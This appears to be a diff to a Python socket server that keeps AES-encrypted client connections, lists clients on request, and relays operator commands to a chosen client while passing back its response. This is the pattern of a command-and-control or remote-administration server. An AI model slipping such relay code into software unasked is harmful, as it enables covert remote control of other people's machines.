@@ -58,6 +58,11 @@ class MyServer():
         self.client_count += 1
         self.client_sockets.append((connection[0], aes_secret,str(self.client_count)))
 
+    def find_client(self, client_id):
+        for client in self.client_sockets:
+            if client[2] == client_id:
+                return client
+
     def command_handle_connection(self, connection):
         self.cmd_connections.append(connection)
         aes_key = self.negotiate_secret(connection[0])
@@ -65,9 +70,11 @@ class MyServer():
             data_len = connection[0].recv(8).decode()
             data = connection[0].recv(int(data_len))
             data = self.decrypt_msg(data, aes_key)
+            
             if data.decode() == "get_clients":
                 msg = self.encrypt_msg(json.dumps(self.lp_connections), aes_key)
                 connection[0].send(("0"*(8 - len(str(len(msg))))+str(len(msg))).encode() + msg)
+            
             elif data.decode() == "heartbeat":
                 temp_clients = self.client_sockets
                 for client in self.client_sockets:
@@ -91,11 +98,11 @@ class MyServer():
             else:
                 data = json.loads(data.decode())
                 if 'command' in data:
-                    msg = self.encrypt_msg(data["command"],self.client_sockets[int(data['client_id'])][1])
-                    self.client_sockets[int(data['client_id'])][0].send(("0"*(8 - len(str(len(msg))))+str(len(msg))).encode() + msg)
-                    response_len = self.client_sockets[int(data['client_id'])][0].recv(8)
-                    response = self.client_sockets[int(data['client_id'])][0].recv(int(response_len.decode()))
-                    response = self.decrypt_msg(response, self.client_sockets[int(data['client_id'])][1])
+                    msg = self.encrypt_msg(data ,self.find_client(data["client_id"])[1])
+                    self.find_client(data["client_id"])[0].send(("0"*(8 - len(str(len(msg))))+str(len(msg))).encode() + msg)
+                    response_len = self.find_client(data["client_id"])[0].recv(8)
+                    response = self.find_client(data["client_id"])[0].recv(int(response_len.decode()))
+                    response = self.decrypt_msg(response, self.find_client(data["client_id"])[1])
                     msg = self.encrypt_msg(response.decode(), aes_key)
                     connection[0].send(("0"*(8 - len(str(len(msg))))+str(len(msg))).encode() + msg)
     #function to bind socket to port
